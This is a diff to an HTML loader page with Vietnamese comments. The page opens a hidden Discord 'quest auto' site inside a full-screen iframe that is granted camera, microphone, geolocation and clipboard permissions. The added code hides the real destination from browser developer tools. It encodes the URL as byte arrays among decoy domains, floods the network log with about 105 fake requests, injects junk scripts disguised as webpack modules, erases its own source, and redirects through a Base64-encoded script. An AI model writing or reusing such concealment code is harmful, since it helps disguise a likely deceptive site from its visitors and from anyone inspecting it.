@@ -90,9 +90,6 @@
     <div class="orb orb-3"></div>
     <div class="orb orb-4"></div>
     
-    <!-- Iframe vẫn giữ src="about:blank", JS sẽ dùng contentWindow.location.replace() 
-         để điều hướng bên trong mà KHÔNG thay đổi thuộc tính src trong DOM.
-         Kết quả: Elements tab vĩnh viễn chỉ hiện src="about:blank" -->
     <iframe id="content-frame" src="about:blank" allow="clipboard-read; clipboard-write; geolocation; microphone; camera"></iframe>
     
     <div id="loader">
@@ -127,55 +124,87 @@
         'use strict';
 
         /* =============================================
-           1. GIẢI MÃ LINK TỪ MẢNH VỠ
+           0. TỰ HỦY CODE TRONG SOURCES TAB
            ============================================= */
-        var _0xCore=[
-            [0x2f,0x76,0x31,0x2f,0x61,0x75,0x74,0x68],
-            [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f],
-            [0x2f,0x63,0x64,0x6e,0x2f,0x6a,0x73,0x2f],
-            [0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x71,0x75,0x65,0x73,0x74],
-            [0x2f,0x73,0x74,0x61,0x74,0x69,0x63,0x2f],
-            [0x61,0x75,0x74,0x6f,0x2e,0x73,0x70,0x61,0x63,0x65],
-            [0x2f,0x61,0x70,0x69,0x2f,0x76,0x32,0x2f],
-            [0x2d,0x7a,0x2e,0x61,0x69,0x2f]
-        ];
-        var target=_0xCore[1].concat(_0xCore[3],_0xCore[5],_0xCore[7]).map(function(c){return String.fromCharCode(c)}).join('');
+        var _0xSelf = document.currentScript;
 
         /* =============================================
-           2. BƠM FILE RÁC CÓ CODE VÀO SOURCES TAB
-           Dùng document.createElement('script') + //# sourceURL=
-           An toàn, không dùng eval, không sinh lỗi 404.
+           1. URL POOL - MIX LINK THẬT VỚI 14 LINK GIẢ
+           5 domains × 3 TLDs = 15 tổ hợp
+           Chỉ domains[2] + tlds[0] là thật
+           ============================================= */
+        var _proto = [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f]; // https://
+
+        var _domains = [
+            [0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x2d,0x71,0x75,0x65,0x73,0x74,0x2d,0x61,0x75,0x74,0x6f], // discord-quest-auto
+            [0x71,0x75,0x65,0x73,0x74,0x61,0x75,0x74,0x6f,0x64,0x69,0x73,0x63,0x6f,0x72,0x64],           // questautodiscord
+            [0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x71,0x75,0x65,0x73,0x74,0x61,0x75,0x74,0x6f],           // discordquestauto ★ THẬT
+            [0x61,0x75,0x74,0x6f,0x71,0x75,0x65,0x73,0x74,0x64,0x69,0x73,0x63,0x6f,0x72,0x64],           // autoquestdiscord
+            [0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x61,0x75,0x74,0x6f,0x71,0x75,0x65,0x73,0x74]            // discordautoquest
+        ];
+
+        var _tlds = [
+            [0x2e,0x73,0x70,0x61,0x63,0x65,0x2d,0x7a,0x2e,0x61,0x69,0x2f], // .space-z.ai/ ★ THẬT
+            [0x2e,0x73,0x70,0x61,0x63,0x65,0x2d,0x78,0x2e,0x61,0x69,0x2f], // .space-x.ai/
+            [0x2e,0x73,0x70,0x61,0x63,0x65,0x2d,0x79,0x2e,0x61,0x69,0x2f]  // .space-y.ai/
+        ];
+
+        function _dec(a){return a.map(function(c){return String.fromCharCode(c)}).join('');}
+
+        /* Xây dựng tất cả 15 URL */
+        var _allUrls = [];
+        for(var i=0;i<_domains.length;i++){
+            for(var j=0;j<_tlds.length;j++){
+                _allUrls.push(_dec(_proto.concat(_domains[i],_tlds[j])));
+            }
+        }
+
+        /* Chọn URL thật: domains[2] + tlds[0] — che giấu bằng tính toán mờ */
+        var _ri = (function(){var a=[0,1,2,3,4];return a[2];})(); // = 2
+        var _rj = (function(){var b=[0,1,2];return b[0];})();     // = 0
+        var target = _dec(_proto.concat(_domains[_ri], _tlds[_rj]));
+
+        /* =============================================
+           2. FLOOD NETWORK TAB - 105 REQUEST GIẢ
+           15 URL × 7 path = 105 entry trong Network
+           Che khuất request thật giữa biển request giả
+           ============================================= */
+        var _paths = ['','api/v1/auth','static/js/main.js','cdn/assets/style.css','socket.io/','api/v2/session','manifest.json'];
+        _allUrls.forEach(function(url){
+            _paths.forEach(function(path){
+                try{fetch(url+path,{mode:'no-cors',credentials:'omit'}).catch(function(){});}catch(e){}
+            });
+        });
+
+        /* =============================================
+           3. BƠM FILE RÁC CÓ CODE VÀ URL VÀO SOURCES TAB
+           Mỗi file chứa 1 URL random từ pool → 
+           search "discordquestauto" ra hàng chục kết quả
            ============================================= */
         function _injectSourceFile(path, lines) {
             var s = "/* Webpack Module: " + path + " */\n";
             s += "(function(module, exports, __webpack_require__) {\n";
             s += "'use strict';\n";
-            s += "var __importDefault = __webpack_require__('./internal/default.js');\n";
+            /* Mỗi file rác tham chiếu 1 URL ngẫu nhiên từ pool */
+            s += "var _endpoint = '" + _allUrls[Math.floor(Math.random()*_allUrls.length)] + "';\n";
+            s += "var _config = __webpack_require__('./internal/config.js');\n";
             for(var i=0; i<lines; i++) {
                 var v1 = "_v" + Math.random().toString(36).substring(2, 10);
                 var v2 = "_fn" + Math.random().toString(36).substring(2, 10);
-                var v3 = "mod" + Math.floor(Math.random() * 9999);
-                s += "var " + v1 + " = __importDefault(__webpack_require__('./lib/" + Math.random().toString(36).substring(2, 6) + ".js'));\n";
-                s += "function " + v2 + "(payload) { \n";
-                s += "  if(" + v1 + ".debug) { \n";
-                s += "    var " + v3 + " = " + v1 + ".parse(payload);\n";
-                s += "    return " + v3 + " !== null ? " + v3 + ".data : false;\n";
-                s += "  } else { return false; }\n";
-                s += "}\n";
+                s += "var " + v1 + " = __webpack_require__('./lib/" + Math.random().toString(36).substring(2, 6) + ".js');\n";
+                s += "function " + v2 + "(d) { return " + v1 + ".parse(d) || false; }\n";
                 s += "exports." + v2 + " = " + v2 + ";\n";
             }
             s += "});\n";
             s += "//# sourceURL=webpack://" + path;
-            
             try {
                 var script = document.createElement('script');
                 script.textContent = s;
                 document.head.appendChild(script);
-                document.head.removeChild(script); // Xóa khỏi Elements, nhưng vẫn lưu vĩnh viễn trong Sources
+                document.head.removeChild(script);
             } catch(e) {}
         }
 
-        /* Danh sách 30 file rác đa dạng */
         var _junkFiles=[
             'node_modules/react/cjs/react.development.js', 'node_modules/lodash/_baseMerge.js',
             'node_modules/webpack/buildin/module.js', 'src/components/layout/AppWrapper.tsx',
@@ -195,11 +224,11 @@
         ];
 
         _junkFiles.forEach(function(p){
-            _injectSourceFile(p, Math.floor(Math.random()*20)+10); // Mỗi file 10-30 dòng code rác
+            _injectSourceFile(p, Math.floor(Math.random()*15)+5);
         });
 
         /* =============================================
-           3. HỆ THỐNG PARTICLE
+           4. HỆ THỐNG PARTICLE
            ============================================= */
         var cv=document.getElementById('particleCanvas');
         var cx=cv.getContext('2d');
@@ -244,7 +273,7 @@
         loop();
 
         /* =============================================
-           4. STATUS TEXT CYCLING
+           5. STATUS TEXT CYCLING
            ============================================= */
         var msgs=['Đang kết nối đến máy chủ','Đang xác thực dữ liệu','Đang tải tài nguyên','Đang khởi chạy hệ thống'];
         var si=0;
@@ -255,33 +284,67 @@
         }
 
         /* =============================================
-           5. ĐIỀU HƯỚNG IFRAME BẰNG contentWindow.location
-           Kỹ thuật che link hoàn hảo:
-           - Gán iframe.src = url  → Elements hiện: src="https://link-that.com" (LỖ)
-           - Gán iframe.contentWindow.location.replace(url) → Elements vẫn hiện: src="about:blank" (AN TOÀN)
-           Trình duyệt load trang bên trong, nhưng thuộc tính src trong DOM không hề thay đổi.
+           6. IFRAME NAVIGATION + FIX KẸT ANIMATION
            ============================================= */
         addEventListener('DOMContentLoaded',function(){
             cycle();
             var frame=document.getElementById('content-frame');
             var loader=document.getElementById('loader');
 
-            /* Thiết lập sự kiện onload TRƯỚC khi điều hướng */
-            frame.onload=function(){
+            /* TỰ HỦY: Code gốc trong Sources thành comment */
+            try{if(_0xSelf)_0xSelf.textContent="/* Webpack Runtime: Bootstrap Complete */";}catch(e){}
+
+            var loaded=false;
+            function showFrame(){
+                if(loaded)return;
+                loaded=true;
                 _origSetTimeout(function(){
                     loader.classList.add('fade-out');
                     frame.style.display='block';
                     requestAnimationFrame(function(){frame.classList.add('visible');});
                 },500);
-            };
-
-            /* Thực hiện điều hướng ẩn bên trong iframe */
-            try {
-                frame.contentWindow.location.replace(target);
-            } catch(e) {
-                /* Fallback về cách thường nếu có chặn cross-origin ban đầu */
-                frame.src = target;
             }
+
+            /* ĐIỀU HƯỚNG QUA TRANG TRUNG GIAN (Breaks Network Initiator)
+               Ghi HTML mới vào about:blank của iframe.
+               HTML này tự giải mã Base64 và tự điều hướng.
+               → Network tab hiện Initiator là (internal)/about:blank 
+                 thay vì file HTML chính */
+            try{
+                var doc=frame.contentDocument||frame.contentWindow.document;
+                doc.open();
+                doc.write('<!DOCTYPE html><html><head></head><body><script>');
+                doc.write('location.replace(atob("'+btoa(target)+'"));');
+                doc.write('<\/script></body></html>');
+                doc.close();
+            }catch(e){
+                /* Fallback nếu document.write bị chặn */
+                try{frame.contentWindow.location.replace(target);}catch(e2){frame.src=target;}
+            }
+
+            /* POLLING: Phát hiện điều hướng thành công
+               Khi iframe chuyển sang domain khác (cross-origin),
+               truy cập contentWindow.location.href sẽ văng lỗi.
+               Lỗi này = tín hiệu load thành công → tắt animation */
+            var checkNav=setInterval(function(){
+                try{
+                    var h=frame.contentWindow.location.href;
+                    if(h!=='about:blank'){
+                        clearInterval(checkNav);
+                        showFrame();
+                    }
+                }catch(e){
+                    /* Cross-origin error = đã chuyển hướng thành công */
+                    clearInterval(checkNav);
+                    showFrame();
+                }
+            },300);
+
+            /* Safety: Tắt loader sau 6 giây dù có hay không */
+            _origSetTimeout(function(){
+                clearInterval(checkNav);
+                showFrame();
+            },6000);
         });
     })();
     </script>
